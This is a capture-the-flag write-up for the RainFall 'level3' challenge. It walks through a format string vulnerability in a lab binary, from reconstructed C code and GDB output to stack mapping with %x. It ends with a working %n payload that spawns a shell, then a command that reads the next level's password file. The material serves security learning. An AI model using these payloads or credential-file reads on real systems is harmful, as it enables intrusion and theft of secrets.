# level3

Let's perform the initial analysis of the binary.

Here is the reconstructed C code of the binary:
```c
#include <stdio.h>
#include <stdlib.h>

// Global variable used for the flag/win condition check
int m = 0; 

void v(void) {
    char local_20c[520];
    
    // Reads up to 512 (0x200) bytes into the buffer
    fgets(local_20c, 0x200, stdin);
    
    // VULNERABILITY: Classic format string bug here!
    // It passes user input directly to printf without a format specifier like %s.
    printf(local_20c);
    
    // 0x40 is 64 in decimal. 
    // The goal of this challenge is to use the format string vulnerability 
    // above to overwrite the global variable 'm' in memory to equal 64.
    if (m == 0x40) {
        fwrite("Wait what?!\n", 1, 12, stdout);
        system("/bin/sh");
    }
}

int main(void) {
    v();
    return 0;
}
```

Let's check the functions and variables in GDB:
```text
(gdb) info functions
All defined functions:
...
0x080484a4  v
0x0804851a  main
...
(gdb) info variable m
All variables matching regular expression "m":

Non-debugging symbols:
0x0804988c  m
```

As shown, the global variable `m` is located at `0x0804988c`. We must overwrite this memory location to satisfy the condition.

However, we cannot perform a standard stack buffer overflow because `fgets` restricts the input length to `0x200` (512 bytes). Instead, we must exploit the format string vulnerability in the call to `printf`.

By using a format string exploit, we can leverage two key format specifiers:
1. **`%n`**: Writes the number of characters printed so far to the memory location pointed to by the corresponding argument.
2. **`%number$`**: Refers to a specific argument number in the argument list.

### How `%n` works:
It writes the number of characters printed before the flag to a variable. For example:
```c
int counter = 0;
printf("this phrase got :%n", &counter); // counter becomes 17
printf(" %d number of chars\n", counter);
```

### How `%number$` works:
It allows us to select a specific argument from the stack. For example:
```c
char *str1 = "here is the str1\n";
char *str2 = "here is the str2\n";
char *str3 = "here is the str3\n";
char *str4 = "here is the str4\n";
printf("this is the string4: %4$s", str1, str2, str3, str4);
```
Result: `this is the string4: here is the str4`

When `printf` is called on our input buffer without arguments, it reads values directly off the stack as if they were parameters. This allows us to read from and write to the stack.

### Mapping the Stack

Let's see where our input is placed on the stack by entering multiple `%x` format specifiers:
```bash
level3@RainFall:~$ ./level3 
%x %x %x %x %x %x %x %x %x %x %x %x
200 b7fd1ac0 b7ff37d0 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 a782520
```

The output shows the repeating value `25207825` (`% x ` in ASCII), indicating that our input buffer is visible on the stack. To find the exact offset, we prefix our input with a distinct marker:
```bash
level3@RainFall:~$ ./level3 
aaaa %x %x %x %x %x %x %x %x %x %x %x %x
aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825
```
As you can see, the value `61616161` (`aaaa`) appears at the **4th** argument position. This means our input buffer starts at argument 4 on the stack.

### Building the Payload
- Target Address of `m`: `0x0804988c`
- Target Value (decimal): `64` (since `0x40` is 64 in decimal)
- Stack Offset: `4`

We place the 4-byte target address of `m` at the start of our format string. We need the total number of characters printed before `%n` to be exactly 64. Since the address occupies 4 bytes, we print `60` additional bytes of padding. Then we use `%4$n` to write the printed count (64) to the address located at the 4th position on the stack (which is the address of `m` at the start of our payload).

Using `[::-1]` to write the target address in little-endian format, we build the payload command:
```bash
python -c 'print "\x08\x04\x98\x8c"[::-1] + "A"*60 + "%4$n"' > payload
```

And run the exploit:
```bash
(cat payload; cat) | ./level3
```
This spawns a shell, allowing us to read the password for `level4`:
```bash
cat /home/user/level4/.pass
```
